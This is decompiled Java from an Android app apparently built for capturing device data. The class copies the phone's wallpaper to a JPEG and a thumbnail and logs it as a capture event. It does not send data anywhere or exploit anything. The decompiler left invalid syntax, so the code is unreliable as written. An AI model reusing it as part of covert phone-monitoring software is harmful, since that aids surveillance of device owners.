package com.vvt.capture.f.b;

import android.app.WallpaperManager;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.drawable.BitmapDrawable;
import com.vvt.events.FxMediaType;
import com.vvt.io.o;
import java.io.File;

public class c
  extends a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.d;
  
  public c(String paramString)
  {
    super(paramString);
  }
  
  public com.vvt.capture.f.b a(Context paramContext)
  {
    boolean bool1 = a;
    if (bool1) {}
    boolean bool2 = false;
    FxMediaType localFxMediaType = null;
    Object localObject = ((BitmapDrawable)WallpaperManager.getInstance(paramContext).getDrawable()).getBitmap();
    String str1 = a();
    String str2 = o.a((Bitmap)localObject, str1);
    str1 = o.a(str2, str1, 800);
    bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    bool1 = com.vvt.ag.b.a(str1);
    if (!bool1)
    {
      bool1 = com.vvt.ag.b.a(str2);
      if (!bool1)
      {
        File localFile = new java/io/File;
        localFile.<init>(str1);
        bool1 = localFile.exists();
        if (!bool1) {
          break label202;
        }
        localObject = new com/vvt/capture/f/b;
        ((com.vvt.capture.f.b)localObject).<init>();
        long l = localFile.length();
        ((com.vvt.capture.f.b)localObject).a(l);
        l = System.currentTimeMillis();
        ((com.vvt.capture.f.b)localObject).b(l);
        localFxMediaType = FxMediaType.JPEG;
        ((com.vvt.capture.f.b)localObject).a(localFxMediaType);
        ((com.vvt.capture.f.b)localObject).a(str2);
        ((com.vvt.capture.f.b)localObject).b(str1);
        bool2 = a;
        if (!bool2) {}
      }
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return (com.vvt.capture.f.b)localObject;
      bool1 = b;
      if (bool1) {}
      label202:
      bool1 = false;
      localObject = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/f/removeFromPath/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */